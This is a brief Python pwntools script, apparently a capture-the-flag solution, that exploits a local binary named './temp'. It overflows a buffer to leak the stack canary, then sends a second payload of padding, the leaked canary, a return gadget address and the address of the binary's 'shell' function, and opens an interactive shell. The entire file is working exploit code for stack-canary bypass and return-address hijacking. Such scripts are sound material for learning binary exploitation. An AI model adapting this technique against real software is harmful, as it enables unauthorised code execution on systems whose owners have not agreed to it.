#!/usr/local/bin/python3
from pwn import *

# p = process('./canary_leak')
# e = ELF('./canary_leak')
p = process('./temp')
e = ELF('./temp')
pause()
shell = e.sym["shell"]
payload = b"a"*57
print(payload)
p.send(payload)


tr = p.recvuntil(payload)
canary = b'\x00'+p.recv(7)
print(canary)


pl = b"a"*56 + canary + b"a"*8+p64(0x000000000040122b)+p64(shell) 
p.send(pl)
print(pl)


p.interactive()


